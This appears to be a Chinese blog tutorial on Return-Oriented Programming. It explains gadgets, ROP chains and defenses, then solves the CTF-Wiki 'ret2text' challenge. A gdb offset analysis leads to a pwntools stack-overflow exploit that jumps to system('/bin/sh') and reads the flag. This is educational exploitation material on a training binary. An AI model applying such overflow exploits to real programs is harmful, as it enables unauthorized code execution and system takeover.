---
title: Basic-ROP-Learning
date: 2025-04-19 13:55:32
tags: Pwn
categories: Pwn
toc: true
style: |
  .post-content {
    font-family: "楷体", "STKaiti", serif;
    font-size: 18px;
  }
index_img: /images/bg3.png
#banner_img: /images/bg3.png
---

## Basic-ROP-Learning



## ROP(Return-Oriented Programming)概述

ROP(Return-Oriented Programming)是一种高级的**代码复用攻击技术**，主要用于绕过现代操作系统的安全防护机制（如DEP/NX）。其核心思想是在**栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。**

### 1. **基本概念**

#### （1）产生背景

- **DEP/NX防护**：现代系统禁止执行栈/堆上的代码（数据执行保护）。

- **ASLR防护**：随机化内存布局，增加预测难度。

- **ROP应对方案**：复用已有代码（`.text`段），避免直接注入shellcode。

#### （2）核心原理

- **Gadget**：以`ret`指令结尾的短指令序列（如`pop eax; ret`）。

- **链式调用**：通过精心构造栈帧，使`ret`指令跳转到下一个gadget，形成"代码链"。

---

### 2. **关键组件**

| 组件            | 作用                                                         |
| --------------- | ------------------------------------------------------------ |
| **Gadget**      | 程序中原有的短指令序列（通常以`ret`结尾），实现基本操作（如读写寄存器）。 |
| **ROP Chain**   | 由多个gadget地址和参数组成的栈数据，控制程序执行流。         |
| **Stack Pivot** | 将栈指针（ESP/RSP）转移到攻击者控制的内存区域（如堆），便于构造链。 |

---

### 3. **攻击步骤**

1. **信息泄露**

   - 获取内存地址（绕过ASLR），如通过格式化字符串漏洞泄露libc基址。

2. **寻找Gadgets**

   - 使用工具（如`ROPgadget`、`ropper`）扫描二进制文件，收集可用gadgets。

3. **构造ROP Chain**

   - 组合gadgets实现目标功能（如调用`system("/bin/sh")`）。

4. **触发漏洞**

   - 通过栈溢出等漏洞覆盖返回地址，跳转到第一个gadget。

---

### 4. **防御措施**

| 防御技术         | 原理                                                         |
| ---------------- | ------------------------------------------------------------ |
| **ASLR**         | 随机化内存布局，增加gadget地址预测难度。                     |
| **Stack Canary** | 在栈帧中插入校验值，防止返回地址被覆盖。                     |
| **CFI**          | 控制流完整性（Control-Flow Integrity），限制跳转目标仅为合法地址。 |
| **PIC/PIE**      | 位置无关代码，增强ASLR效果。                                 |

### 5.实例 Linux x86 ROP Exploit

##### (1) ret2text

- #### **基本分析**

[点击下载: ret2text](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text)

先看看程序的保护机制

```Bash
~ checksec ret2text
[*] '/ret2text'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
    Debuginfo:  Yes
```

可以看出程序是 32 位程序，且仅开启了栈不可执行保护。接下来我们使用 IDA 反编译该程序：

```C++
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[100]; // [esp+1Ch] [ebp-64h] BYREF

  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts("There is something amazing here, do you know anything?");
  gets(s);
  printf("Maybe I will tell you next time !");
  return 0;
}
```

我们可以看到，程序在`main`函数使用了很可疑的`gets`，那程序中就存在栈溢出漏洞，我们回到IDA看反汇编代码

```C++
.text:080485FD secure          proc near
.text:080485FD
.text:080485FD input           = dword ptr -10h
.text:080485FD secretcode      = dword ptr -0Ch
.text:080485FD
.text:080485FD ; __unwind {
.text:080485FD                 push    ebp
.text:080485FE                 mov     ebp, esp
.text:08048600                 sub     esp, 28h
.text:08048603                 mov     dword ptr [esp], 0 ; timer
.text:0804860A                 call    _time
.text:0804860F                 mov     [esp], eax      ; seed
.text:08048612                 call    _srand
.text:08048617                 call    _rand
.text:0804861C                 mov     [ebp+secretcode], eax
.text:0804861F                 lea     eax, [ebp+input]
.text:08048622                 mov     [esp+4], eax
.text:08048626                 mov     dword ptr [esp], offset unk_8048760
.text:0804862D                 call    ___isoc99_scanf
.text:08048632                 mov     eax, [ebp+input]
.text:08048635                 cmp     eax, [ebp+secretcode]
.text:08048638                 jnz     short locret_8048646
.text:0804863A                 mov     dword ptr [esp], offset command ; "/bin/sh"
.text:08048641                 call    _system 

```

在`secure`函数中我们看到了存在调用`system("/bin/sh")`，那我们的思路就是只能能覆盖到这个地址(即`0x0804863A`)上就可以拿到shell了，现在再来确定我们能够控制的内存的起始地址距离`main` 函数的返回地址的字节数。

``` C++
.text:080486A7                 lea     eax, [esp+80h+s]
.text:080486AB                 mov     [esp], eax      ; s
.text:080486AE                 call    _gets
.text:080486B3                 mov     dword ptr [esp], offset format ; "Maybe I will tell you next time !"
.text:080486BA                 call    _printf
.text:080486BF                 mov     eax, 0
.text:080486C4                 leave
```

用gef调试看看，现在`call _gets`的地址处下断点，然后run一下

```C++
~ gdb ret2text
GNU gdb (Ubuntu 12.1-0ubuntu1~22.04.2) 12.1
Copyright (C) 2022 Free Software Foundation, Inc.
gef➤ b *0x080486AE 
Breakpoint 1 at 0x80486ae: file ret2text.c, line 24. 
gef➤ r 
There is something amazing here, do you know anything? Breakpoint 1, 0x080486ae in main () at ret2text.c:24

[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffcf6c  →  0xf7fc66d0  →  0x0000000e
$ebx   : 0xf7fac000  →  0x00229dac
$ecx   : 0xf7fad9b4  →  0x00000000
$edx   : 0x1
$esp   : 0xffffcf50  →  0xffffcf6c  →  0xf7fc66d0  →  0x0000000e
$ebp   : 0xffffcfd8  →  0xf7ffd020  →  0xf7ffda40  →  0x00000000
$esi   : 0xffffd094  →  0xffffd1fc  →  "/home/explorer/CTF-Challenge/Pwn/linux/user-mode/s[...]"
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x080486ae  →  <main+0066> call 0x8048460 <gets@plt>
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
```

- #### **栈内存布局分析**

`buf`地址：`0xffffcd5c`(因为它是由 `eax` 和 `esp` 指向)，`ebp` 是 `0xffffcdc8`，而 `buf` 在 `0xffffcd5c`，两者距离为：0xffffcdc8 - 0xffffcd5c = 0x6c (108 字节), 因此，输入 108 字节后即可覆盖返回地址。

  - #### **验证猜想**

    通过我们上面的分析可以构造以下payload:

```Python
##!/usr/bin/env python
from pwn import *

sh = process('./ret2text')
target = 0x804863a
sh.sendline(b'A' * 108 + p32(target))
sh.interactive()
```

得到以下输出，想想是哪里出了问题呢？

```Bash
~ python3 exp.py
[+] Starting local process './ret2text': pid 1593
[*] Switching to interactive mode
There is something amazing here, do you know anything?
Maybe I will tell you next time ![*] Got EOF while reading in interactive
$ ls
[*] Process './ret2text' stopped with exit code -11 (SIGSEGV) (pid 1593)
[*] Got EOF while sending in interactive
```

在此，笔者需要做一个小提示，在某些情况下，寄存器会占用栈空间（后续会专门发文详述），而在32位情况下。我们的`ebp`占用了4字节，所以正确的偏移地址应该是：

```
总偏移 = buf 到 EBP 的距离 (0x6c) + EBP 自身大小 (4) = 0x70 (112)
```

因此，正确的payload是：

```Python
##!/usr/bin/env python
from pwn import *

sh = process('./ret2text')
target = 0x804863a
# sh.sendline(b'A' * (108+4) + p32(target))
sh.sendline(b'A' *(108+4) + p32(target))
sh.interactive()
```

输出如下：

```Bash
explorer@DESKTOP-JPMNN21:~/CTF-Challenge/Pwn/linux/user-mode/stackoverflow/x86/basic-rop$ python3 exp.py
[+] Starting local process './ret2text': pid 1766
[*] Switching to interactive mode
There is something amazing here, do you know anything?
Maybe I will tell you next time !$ ls
exp.py  flag  ret2text
$ cat flag
flag{This_is_the_right_payload}
$
[*] Interrupted
[*] Stopped process './ret2text' (pid 1766)
```

不断更新，敬请期待！

###### 参考文献及相关资料来源

[CTF-Wiki](https://ctf-wiki.org/)
[DeepSeek](https://chat.deepseek.com/)



<script src="https://giscus.app/client.js"
        data-repo="solkatt-cn/solkatt-cn.github.io"
        data-repo-id="R_kgDONzaTTQ"
        data-category="Announcements"
        data-category-id="DIC_kwDONzaTTc4Cpqn7"
        data-mapping="pathname"
        data-strict="0"
        data-reactions-enabled="1"
        data-emit-metadata="0"
        data-input-position="top"
        data-theme="preferred_color_scheme"
        data-lang="zh-CN"
        crossorigin="anonymous"
        async>
</script>
